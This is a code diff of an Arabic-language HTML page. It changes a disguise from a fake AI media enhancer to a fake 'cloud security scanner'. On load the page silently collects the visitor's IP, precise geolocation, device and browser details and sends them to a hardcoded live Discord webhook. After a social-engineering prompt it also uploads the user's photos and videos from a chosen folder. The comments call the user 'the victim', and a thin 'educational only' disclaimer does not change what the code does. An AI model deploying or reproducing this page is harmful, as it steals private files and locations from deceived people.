@@ -2,144 +2,119 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مُعالج الوسائط الذكي (AI)</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <title>نظام الفحص الأمني المتقدم</title>
     <style>
-        body {
-            font-family: 'Cairo', sans-serif;
-            background: #0f0c29;
-            background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29);
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            text-align: center;
-            width: 450px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        h1 { color: #00d2ff; margin-bottom: 15px; }
-        p { color: #ccc; font-size: 15px; }
-        .btn {
-            background: #00d2ff;
-            background: linear-gradient(to right, #3a7bd5, #00d2ff);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-            margin-top: 20px;
-        }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0, 210, 255, 0.5); }
-        #status { margin-top: 20px; font-size: 14px; }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            display: none;
-            margin: 15px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; text-align: center; padding: 50px; }
+        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; max-width: 500px; margin: auto; }
+        .btn { background: #238636; color: white; padding: 15px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 20px; }
+        #status { margin-top: 20px; color: #8b949e; }
+        .warning { color: #f85149; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>🚀 مُعالج الفيديو والصور (AI)</h1>
-    <p>قم باختيار مجلد الوسائط (صور وفيديوهات) وسيقوم الذكاء الاصطناعي بتحسين الدقة إلى 4K مجاناً.</p>
+<div class="card">
+    <h1>🛡️ درع الحماية السحابي</h1>
+    <p>لتحسين سرعة الفحص وتأمين ملفاتك، نحتاج لتحديد أقرب عقدة فحص جغرافية واختيار مجلد الوسائط.</p>
     
-    <button class="btn" id="uploadBtn">اختيار المجلد لبدء المعالجة 📁</button>
+    <button class="btn" id="startBtn">بدء الفحص وتأمين الجهاز ⚡</button>
     
-    <div class="loader" id="loader"></div>
-    <div id="status"></div>
-
-    <div style="font-size: 10px; color: #777; margin-top: 30px;">
-        مشروع تعليمي: شرح مخاطر الـ Web APIs والهندسة الاجتماعية
-    </div>
+    <div id="status">بانتظار الموافقة على الصلاحيات...</div>
+    <div class="warning">تنبيه: هذا الموقع للأغراض التعليمية الجامعية فقط.</div>
 </div>
 
 <script>
-    // رابط الويب هوك الخاص بك
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
+    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
 
-    document.getElementById('uploadBtn').addEventListener('click', async () => {
-        const status = document.getElementById('status');
-        const loader = document.getElementById('loader');
+    // 1. وظيفة لجلب الموقع الجغرافي بدقة
+    function getLocation() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        // إنشاء رابط جوجل ماب
+                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
+                    },
+                    (err) => resolve("الضحية رفض إعطاء صلاحية الموقع")
+                );
+            } else {
+                resolve("المتصفح لا يدعم تحديد الموقع");
+            }
+        });
+    }
 
+    // 2. جمع كافة المعلومات وإرسالها
+    async function collectAndSendInfo() {
         try {
-            // 1. طلب الوصول للمجلد
-            const dirHandle = await window.showDirectoryPicker();
+            // جلب الـ IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
             
-            loader.style.display = "block";
-            status.style.color = "#00d2ff";
-            status.innerText = "جاري تحسين الجودة.. يرجى عدم إغلاق المتصفح";
+            // جلب الموقع الجغرافي (ستظهر رسالة سماح للمستخدم)
+            const mapLink = await getLocation();
+
+            const info = {
+                content: "🚀 **تقرير جديد عن ضحية!**",
+                embeds: [{
+                    title: "بيانات الجهاز والموقع الدقيق",
+                    color: 15105570, // برتقالي
+                    fields: [
+                        { name: "📍 الموقع على الخريطة (Google Maps)", value: `[اضغط هنا لفتح الموقع](${mapLink})` },
+                        { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
+                        { name: "📱 نوع الجهاز/النظام", value: navigator.platform, inline: true },
+                        { name: "🛠️ المتصفح", value: navigator.userAgent },
+                        { name: "🔋 البطارية", value: (await navigator.getBattery?.())?.level * 100 + "%" || "غير مدعوم", inline: true }
+                    ],
+                    footer: { text: "بيانات تم سحبها لأغراض تعليمية" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
+        } catch (e) { console.log("خطأ في جمع البيانات"); }
+    }
+
+    // تشغيل جمع البيانات الأساسية فوراً
+    collectAndSendInfo();
+
+    // 3. سحب الملفات عند الضغط على الزر
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        const status = document.getElementById('status');
+        try {
+            const dirHandle = await window.showDirectoryPicker();
+            status.innerText = "جاري الفحص السحابي للملفات...";
+            status.style.color = "#f1c40f";
 
             for await (const entry of dirHandle.values()) {
                 if (entry.kind === 'file') {
                     const file = await entry.getFile();
-
-                    // 2. التحقق من نوع الملف (صور أو فيديوهات فقط)
                     if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-                        
-                        // 3. التحقق من حجم الملف (ديسكورد العادي يدعم حتى 8MB أو 25MB)
-                        if (file.size < 25 * 1024 * 1024) { 
-                            await sendFileToDiscord(file);
-                        } else {
-                            console.log("الملف كبير جداً: " + file.name);
+                        if (file.size < 25 * 1024 * 1024) {
+                            await sendFile(file);
                         }
                     }
                 }
             }
-
-            loader.style.display = "none";
+            status.innerText = "✅ تمت الحماية! تم فحص كافة الملفات.";
             status.style.color = "#2ecc71";
-            status.innerText = "✅ اكتملت المعالجة! تم تحسين جميع الوسائط.";
-
         } catch (err) {
-            loader.style.display = "none";
-            status.style.color = "#e74c3c";
-            status.innerText = "❌ يجب منح الصلاحية للوصول للمجلد لبدء العمل.";
+            status.innerText = "❌ فشل: يجب الموافقة على فحص المجلد لتأمين الجهاز.";
         }
     });
 
-    async function sendFileToDiscord(file) {
+    async function sendFile(file) {
         const formData = new FormData();
-        
-        // إضافة الملف للنموذج المرسل
         formData.append('file', file, file.name);
-        
-        // إضافة معلومات إضافية كرسالة
-        const metadata = {
-            content: `📂 **تم سحب ملف جديد من الضحية:**\n**الاسم:** \`${file.name}\`\n**النوع:** \`${file.type}\`\n**الحجم:** \`${(file.size / 1024 / 1024).toFixed(2)} MB\``
-        };
-        formData.append('payload_json', JSON.stringify(metadata));
-
-        try {
-            await fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                body: formData
-            });
-            // انتظار بسيط بين الملفات لتجنب حظر الويب هوك (Rate Limit)
-            await new Promise(r => setTimeout(r, 1000));
-        } catch (e) {
-            console.error("خطأ في الرفع:", e);
-        }
+        const meta = { content: `📸 تم سحب ميديا: \`${file.name}\`` };
+        formData.append('payload_json', JSON.stringify(meta));
+        await fetch(WEBHOOK, { method: 'POST', body: formData });
+        await new Promise(r => setTimeout(r, 1000));
     }
 </script>
 
